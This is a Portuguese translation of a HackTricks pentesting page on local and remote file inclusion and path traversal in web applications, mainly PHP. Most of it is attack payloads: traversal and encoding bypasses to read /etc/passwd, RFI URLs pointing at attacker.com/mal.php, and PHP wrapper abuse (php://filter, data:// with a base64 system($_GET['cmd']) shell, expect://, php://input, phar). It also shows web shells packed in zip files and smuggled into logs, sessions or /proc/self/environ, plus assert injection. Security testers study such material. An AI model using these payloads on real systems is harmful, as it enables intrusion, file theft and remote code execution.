# Inclusão de Arquivos/Travessia de Caminho

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais de bugs web3

🔔 Receba notificações sobre novos programas de recompensa por bugs

💬 Participe de discussões na comunidade

## Inclusão de Arquivos

**Inclusão de Arquivos Remotos (RFI):** O arquivo é carregado a partir de um servidor remoto (Melhor: você pode escrever o código e o servidor irá executá-lo). No PHP, isso é **desativado** por padrão (**allow\_url\_include**).\
**Inclusão de Arquivos Locais (LFI):** O servidor carrega um arquivo local.

A vulnerabilidade ocorre quando o usuário pode controlar de alguma forma o arquivo que será carregado pelo servidor.

Funções **PHP vulneráveis**: require, require\_once, include, include\_once

Uma ferramenta interessante para explorar essa vulnerabilidade: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Cegos - Arquivos Interessantes - LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

Misturando várias listas LFI \*nix e adicionando mais caminhos, criei esta:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Tente também trocar `/` por `\`\
Tente também adicionar `../../../../../`

Uma lista que usa várias técnicas para encontrar o arquivo /etc/password (para verificar se a vulnerabilidade existe) pode ser encontrada [aqui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Misturando várias listas, criei esta:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Tente também trocar `/` por `\`\
Tente também remover `C:/` e adicionar `../../../../../`

Uma lista que usa várias técnicas para encontrar o arquivo /boot.ini (para verificar se a vulnerabilidade existe) pode ser encontrada [aqui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Verifique a lista LFI do Linux.

## LFI básico e bypasses

Todos os exemplos são para Inclusão de Arquivo Local, mas podem ser aplicados também à Inclusão de Arquivo Remoto (page=[http://meuserver.com/phpshellcode.txt\\](http://meuserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sequências de travessia sem recursão removidas
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Byte nulo (%00)**

Bypass para adicionar mais caracteres ao final da string fornecida (bypass de: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Isso está **resolvido desde o PHP 5.4**

### **Codificação**

Você pode usar codificações não padrão, como a codificação dupla de URL (e outras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### A partir da pasta existente

Talvez o back-end esteja verificando o caminho da pasta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Identificando pastas em um servidor

Dependendo do código aplicativo / caracteres permitidos, pode ser possível explorar recursivamente o sistema de arquivos descobrindo pastas e não apenas arquivos. Para fazer isso:

* identifique a "profundidade" do diretório atual obtendo com sucesso `/etc/passwd` (se estiver no Linux):
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* tente adivinhar o nome de uma pasta no diretório atual adicionando o nome da pasta (aqui, `private`), e depois voltando para `/etc/passwd`:
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd 
```
* Se a aplicação for vulnerável, pode haver dois resultados diferentes para a solicitação:
  * Se você receber um erro / sem saída, a pasta `private` não existe neste local
  * Se você receber o conteúdo de `/etc/passwd`, validou que há de fato uma pasta `private` no diretório atual
* As pastas que você descobriu usando essa técnica podem então ser fuzzed para arquivos (usando um método clássico de LFI) ou para subdiretórios usando a mesma técnica recursivamente.

É possível adaptar essa técnica para encontrar diretórios em qualquer local no sistema de arquivos. Por exemplo, se, sob a mesma hipótese (diretório atual com profundidade 3 no sistema de arquivos), você quiser verificar se `/var/www/` contém um diretório `private`, use a seguinte carga útil:
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
A seguinte sequência de comandos permite a geração de payloads usando `sed` (1) como entrada para ferramentas de fuzzing de URL, como `ffuf` (2):
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
### **Truncamento de caminho**

Bypass da adição de mais caracteres no final da string fornecida (bypass de: $\_GET\['param']."php")
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Sempre tente **começar** o caminho com um diretório falso (a/).

**Essa vulnerabilidade foi corrigida no PHP 5.3.**

### **Truques de bypass de filtro**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
```
## RFI Básico
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
## Elemento raiz do Python

Em Python, em um código como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Se o usuário passar um **caminho absoluto** para o **`file_name`**, o **caminho anterior é simplesmente removido**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
É o comportamento esperado de acordo com [a documentação](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Se um componente é um caminho absoluto, todos os componentes anteriores são descartados e a junção continua a partir do componente de caminho absoluto.

## Listando diretórios em Java

Parece que se você tiver uma Traversal de Caminho em Java e **solicitar um diretório** em vez de um arquivo, uma **lista do diretório é retornada**. Isso não acontecerá em outras linguagens (que eu saiba).

## Top 25 parâmetros

Aqui está a lista dos 25 principais parâmetros que podem ser vulneráveis a vulnerabilidades de inclusão de arquivo local (LFI) (de [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI usando wrappers e protocolos PHP

### php://filter

Os filtros PHP permitem realizar **operações básicas de modificação nos dados** antes de serem lidos ou escritos. Existem 5 categorias de filtros:

* [Filtros de string](https://www.php.net/manual/en/filters.string.php):
  * `string.rot13`
  * `string.toupper`
  * `string.tolower`
  * `string.strip_tags`: Remove tags dos dados (tudo entre os caracteres "<" e ">")
    * Note que este filtro desapareceu das versões modernas do PHP
* [Filtros de conversão](https://www.php.net/manual/en/filters.convert.php)
  * `convert.base64-encode`
  * `convert.base64-decode`
  * `convert.quoted-printable-encode`
  * `convert.quoted-printable-decode`
  * `convert.iconv.*` : Transforma para uma codificação diferente (`convert.iconv.<input_enc>.<output_enc>`). Para obter a **lista de todas as codificações** suportadas, execute no console: `iconv -l`

{% hint style="warning" %}
Abusando do filtro de conversão `convert.iconv.*`, você pode **gerar texto arbitrário**, o que pode ser útil para escrever texto arbitrário ou fazer com que uma função como include processe texto arbitrário. Para mais informações, consulte [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtros de compressão](https://www.php.net/manual/en/filters.compression.php)
  * `zlib.deflate`: Comprime o conteúdo (útil se estiver extraindo muitas informações)
  * `zlib.inflate`: Descomprime os dados
* [Filtros de criptografia](https://www.php.net/manual/en/filters.encryption.php)
  * `mcrypt.*` : Descontinuado
  * `mdecrypt.*` : Descontinuado
* Outros filtros
  * Executando em php `var_dump(stream_get_filters());`, você pode encontrar alguns **filtros inesperados**:
    * `consumed`
    * `dechunk`: inverte a codificação chunked HTTP
    * `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
```
{% hint style="warning" %}
A parte "php://filter" é insensível a maiúsculas e minúsculas.
{% endhint %}

### php://fd

Este wrapper permite acessar descritores de arquivos que o processo tem abertos. Potencialmente útil para exfiltrar o conteúdo de arquivos abertos:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Também é possível usar **php://stdin, php://stdout e php://stderr** para acessar os **descritores de arquivo 0, 1 e 2**, respectivamente (não tenho certeza de como isso poderia ser útil em um ataque).

### zip:// e rar://

Faça o upload de um arquivo Zip ou Rar com um PHPShell dentro e acesse-o.\
Para poder abusar do protocolo rar, é **necessário ativá-lo especificamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

A pseudo-protocol used in some programming languages to represent in-memory data as if it were a file. This can be used in file inclusion vulnerabilities to include arbitrary data in the application. 

For example, in PHP, the `data://` protocol can be used to include base64-encoded data:

```php
<?php
include 'data://text/plain;base64,SGVsbG8sIFdvcmxkIQ%3D%3D';
?>
```

This would include the text "Hello, World!" in the application. 

Note that not all programming languages support the `data://` protocol, and even in those that do, it may be disabled or restricted by the server configuration.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Curiosidade: você pode acionar um XSS e contornar o Auditor do Chrome com: `http://exemplo.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

Observe que este protocolo é restrito pelas configurações do PHP **`allow_url_open`** e **`allow_url_include`**

### expect://

O Expect deve ser ativado. Você pode executar código usando isso.
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifique sua carga útil nos parâmetros POST.
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

Um arquivo `.phar` também pode ser usado para executar código PHP se o site estiver usando alguma função como `include` para carregar o arquivo.

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

E você pode compilar o `phar` executando a seguinte linha:
```bash
php --define phar.readonly=0 create_path.php
```
Será gerado um arquivo chamado `test.phar` que você pode usar para abusar do LFI.

Se o LFI estiver apenas lendo o arquivo e não executando o código php dentro dele, por exemplo, usando funções como _**file\_get\_contents(), fopen(), file() or file\_exists(), md5\_file(), filemtime() or filesize()**_**.** Você pode tentar abusar de uma **desserialização** que ocorre quando a **leitura** de um **arquivo** é feita usando o protocolo **phar**.\
Para mais informações, leia o seguinte post:

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Mais protocolos

Verifique mais possíveis [**protocolos para incluir aqui**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory e php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Escreva na memória ou em um arquivo temporário (não tenho certeza de como isso pode ser útil em um ataque de inclusão de arquivo)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Acessando o sistema de arquivos local
* [http://](https://www.php.net/manual/en/wrappers.http.php) — Acessando URLs HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Acessando URLs FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Fluxos de compressão
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Encontre nomes de caminho que correspondam ao padrão (não retorna nada imprimível, então não é realmente útil aqui)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Fluxos de áudio (Não é útil para ler arquivos arbitrários)

## LFI via 'assert' do PHP

Se você encontrar um LFI difícil que pareça estar filtrando strings de travessia, como ".." e respondendo com algo como "Tentativa de hacking" ou "Boa tentativa!", uma carga útil de injeção de 'assert' pode funcionar.

Uma carga útil como esta:
```
' and die(show_source('/etc/passwd')) or '
```
irá explorar com sucesso o código PHP para um parâmetro "file" que se parece com isso:
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
Também é possível obter RCE em uma declaração "assert" vulnerável usando a função system().
```
' and die(system("whoami")) or '
```
Certifique-se de codificar em URL os payloads antes de enviá-los.

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga a HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais sobre bugs web3

🔔 Receba notificações sobre novas recompensas por bugs

💬 Participe de discussões na comunidade

## Traversal de Caminho Cego em PHP

{% hint style="warning" %}
Esta técnica é relevante em casos em que você **controla** o **caminho do arquivo** de uma **função PHP** que irá **acessar um arquivo** mas você não verá o conteúdo do arquivo (como uma simples chamada a **`file()`**) mas o conteúdo não é mostrado.
{% endhint %}

Neste [**post incrível**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) é explicado como um traversal de caminho cego pode ser abusado via filtro PHP para **exfiltrar o conteúdo de um arquivo via um oráculo de erro**.

Em resumo, a técnica usa a codificação **"UCS-4LE"** para tornar o conteúdo de um arquivo tão **grande** que a **função PHP que abre** o arquivo irá acionar um **erro**.

Então, para vazar o primeiro caractere, o filtro **`dechunk`** é usado juntamente com outros, como **base64** ou **rot13** e, finalmente, os filtros **convert.iconv.UCS-4.UCS-4LE** e **convert.iconv.UTF16.UTF-16BE** são usados para **colocar outros caracteres no início e vazá-los**.

**Funções que podem ser vulneráveis**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (somente alvo somente leitura com isso)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Para detalhes técnicos, verifique o post mencionado!

## LFI2RCE

### RFI Básico
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
### Via arquivo de log do Apache/Nginx

Se o servidor Apache ou Nginx for **vulnerável a LFI** dentro da função include, você pode tentar acessar **`/var/log/apache2/access.log` ou `/var/log/nginx/access.log`**, definir dentro do **user agent** ou dentro de um **parâmetro GET** um shell php como **`<?php system($_GET['c']); ?>`** e incluir esse arquivo.

{% hint style="warning" %}
Observe que **se você usar aspas duplas** para o shell em vez de **aspas simples**, as aspas duplas serão modificadas para a string "_**quote;**_", **o PHP lançará um erro** lá e **nada mais será executado**.

Além disso, certifique-se de **escrever corretamente o payload** ou o PHP lançará um erro toda vez que tentar carregar o arquivo de log e você não terá uma segunda oportunidade.
{% endhint %}

Isso também pode ser feito em outros logs, mas **tenha cuidado**, o código dentro dos logs pode estar codificado em URL e isso pode destruir o Shell. O cabeçalho **authorisation "basic"** contém "user:password" em Base64 e é decodificado dentro dos logs. O PHPShell pode ser inserido dentro deste cabeçalho.\
Outros possíveis caminhos de log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Lista de palavras para fuzzing: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Envie um e-mail** para uma conta interna (user@localhost) contendo sua carga útil PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e tente incluir no e-mail do usuário com um caminho como **`/var/mail/<USERNAME>`** ou **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Faça upload de muitos shells (por exemplo: 100)
2. Inclua [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), com $PID = PID do processo (pode ser forçado por brute force) e $FD o descritor de arquivo (também pode ser forçado por brute force)

### Via /proc/self/environ

Como um arquivo de log, envie a carga útil no User-Agent, ela será refletida dentro do arquivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Se você pode fazer upload de um arquivo, basta injetar o payload do shell nele (por exemplo: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para manter o arquivo legível, é melhor injetar nos metadados das imagens/doc/pdf.

### Via upload de arquivo Zip

Faça o upload de um arquivo ZIP contendo um shell PHP comprimido e acesse:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via sessões PHP

Verifique se o site utiliza sessões PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Em PHP, essas sessões são armazenadas em arquivos _/var/lib/php5/sess\\_\[PHPSESSID]\_.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Defina o cookie para `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Use o LFI para incluir o arquivo de sessão PHP.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Se o ssh estiver ativo, verifique qual usuário está sendo usado (/proc/self/status e /etc/passwd) e tente acessar **\<HOME>/.ssh/id\_rsa**

### **Via** **logs** do **vsftpd**

Os logs deste servidor FTP são armazenados em _**/var/log/vsftpd.log.**_ Se você tiver uma LFI e puder acessar um servidor vsftpd exposto, poderá tentar fazer login definindo a carga útil PHP no nome de usuário e, em seguida, acessar os logs usando o LFI.

### Via filtros php (sem necessidade de arquivo)

Este [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explica que você pode usar **filtros php para gerar conteúdo arbitrário** como saída. O que basicamente significa que você pode **gerar código php arbitrário** para a inclusão **sem precisar escrevê-lo** em um arquivo.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via falha de segmentação

**Faça upload** de um arquivo que será armazenado como **temporário** em `/tmp`, então na **mesma solicitação,** acione uma **falha de segmentação**, e então o **arquivo temporário não será excluído** e você pode procurá-lo.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via armazenamento de arquivos temporários do Nginx

Se você encontrou uma **Local File Inclusion** e o **Nginx** está sendo executado na frente do PHP, você pode ser capaz de obter RCE com a seguinte técnica:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

Se você encontrou uma **Local File Inclusion** mesmo que você **não tenha uma sessão** e `session.auto_start` esteja `Off`. Se você fornecer o **`PHP_SESSION_UPLOAD_PROGRESS`** nos dados **multipart POST**, o PHP irá **ativar a sessão para você**. Você pode abusar disso para obter RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via uploads de arquivos temporários no Windows

Se você encontrou uma **Local File Inclusion** e o servidor está sendo executado no **Windows**, você pode obter RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via phpinfo() (file\_uploads = on)

Se você encontrou uma **Local File Inclusion** e um arquivo expondo **phpinfo()** com file\_uploads = on, você pode obter RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Divulgação de caminho

Se você encontrou uma **Local File Inclusion** e você **pode exfiltrar o caminho** do arquivo temporário, MAS o **servidor** está **verificando** se o **arquivo a ser incluído tem marcas PHP**, você pode tentar **burlar essa verificação** com esta **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via espera eterna + força bruta

Se você puder abusar do LFI para **fazer upload de arquivos temporários** e fazer o servidor **pendurar** a execução do PHP, você poderá então **forçar nomes de arquivos por horas** para encontrar o arquivo temporário:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Para erro fatal

Se você incluir qualquer um dos arquivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Você precisa incluir o mesmo duas vezes para lançar esse erro).

**Eu não sei como isso é útil, mas pode ser.**\
_Mesmo que você cause um erro fatal do PHP, os arquivos temporários do PHP enviados são excluídos._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Referências

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/en-local-file-inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga o HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais de bugs web3

🔔 Receba notificações sobre novos programas de recompensas por bugs

💬 Participe de discussões na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga** me no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
